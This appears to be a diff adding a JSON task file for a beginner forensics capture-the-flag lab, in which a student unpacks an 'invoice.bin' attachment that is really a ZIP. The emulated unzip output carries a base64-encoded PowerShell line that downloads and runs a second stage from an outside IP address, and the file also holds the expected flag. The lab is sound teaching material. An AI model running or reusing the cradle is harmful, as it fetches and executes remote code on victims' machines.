@@ -1,0 +1,50 @@
+{
+ "id": "forensics-intro",
+ "workdir": "/home/student/task",
+ "hostname": "lab",
+ "expect": {
+  "file": "/home/student/task/found.txt",
+  "contains": "nto{m4g1c_byt3s_d0nt_l13}"
+ },
+ "fs": [
+  {
+   "path": "/home/student/task",
+   "type": "dir"
+  },
+  {
+   "path": "/home/student/task/task.md",
+   "text": "# Задача: разобрать подозрительное вложение\n\nКоллега переслал файл `invoice.bin` — «пришёл на почту, похоже на счёт».\nЗапускать его нельзя. Разберись, что это на самом деле, и найди флаг.\n\nШаги:\n1. `ls -la` и `file invoice.bin` — определи истинный тип по сигнатуре.\n2. Это архив: `unzip -l invoice.bin` покажет содержимое.\n3. Достань скрипт: `unzip -p invoice.bin update.ps1 > update.ps1`.\n4. `cat update.ps1` — там base64-нагрузка. Раскодируй: `base64 -d update.ps1 > dec.txt`.\n5. `cat dec.txt` — увидишь C2-URL и флаг. Сохрани: `grep nto dec.txt > found.txt`.\n"
+  },
+  {
+   "path": "/home/student/task/notes.txt",
+   "text": "Заметки аналитика:\n- Расширению верить нельзя — истинный тип по первым байтам (`xxd -l 16`).\n- Сначала хеш оригинала (`sha256sum`), потом рабочая копия.\n- ZIP начинается с `PK` (`50 4b`).\n"
+  },
+  {
+   "path": "/home/student/task/invoice.bin",
+   "b64": "UEsDBBQAAAAIAGepTV1Ooa4uQgAAAFQAAAALAAAAaW52b2ljZS50eHTz9Avz93R2VVA2MTE04nLMzS/NK7FSMDax1DMwUHANDeIKSKxUKMm3UnB09nVV8ClJ4fJ0cvSzUnBxBcobGGAjuABQSwMEFAAAAAgAZ6lNXSE+rxaMAAAAlQAAAAoAAAB1cGRhdGUucHMxDchLEoIgAADQfacxiqkWrsAPJDqSJrELSUsdqik/cPp6y3cqzxeC7pkU9bcA9C2r1CMBHDSCQlYUq2gYlMlfSc8nDeBHgbAvN9xeK2iOSD91zOfssZ9Y0a6TjliGtgvDwZjag9NRaGRBxjpmC7X9jiDWKsOnG/A86cJOAAo1Tp0A+fz/RuHANbnvr35QSwECFAMUAAAACABnqU1dTqGuLkIAAABUAAAACwAAAAAAAAAAAAAAgAEAAAAAaW52b2ljZS50eHRQSwECFAMUAAAACABnqU1dIT6vFowAAACVAAAACgAAAAAAAAAAAAAAgAFrAAAAdXBkYXRlLnBzMVBLBQYAAAAAAgACAHEAAAAfAQAAAAA=",
+   "mode": "644"
+  }
+ ],
+ "tools": {
+  "unzip": {
+   "help": "unzip [-l | -p <файл>] <архив> — эмуляция вывода реального unzip",
+   "cases": [
+    {
+     "match": "\\-l\\s+invoice\\.bin",
+     "example": "-l invoice.bin",
+     "output": "Archive:  invoice.bin\n  Length      Date    Time    Name\n---------  ---------- -----   ----\n       84  2026-10-12 08:26   invoice.txt\n       149  2026-10-12 08:26   update.ps1\n---------                     -------\n       233                     2 files\n"
+    },
+    {
+     "match": "\\-p\\s+invoice\\.bin\\s+update\\.ps1",
+     "example": "-p invoice.bin update.ps1",
+     "output": "SUVYIChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwOi8vMTg1LjIyMC4xMDEuNy9zdGFnZTIucHMxJyk7ICMgbnRve200ZzFjX2J5dDNzX2QwbnRfbDEzfQ==\n"
+    },
+    {
+     "match": "\\-p\\s+invoice\\.bin\\s+invoice\\.txt",
+     "example": "-p invoice.bin invoice.txt",
+     "output": "INVOICE #4412\nAmount: 349.00 EUR\nPay to: ACME Ltd\nIBAN: DE00 0000 0000 0000 0000 00\n"
+    }
+   ]
+  }
+ }
+}
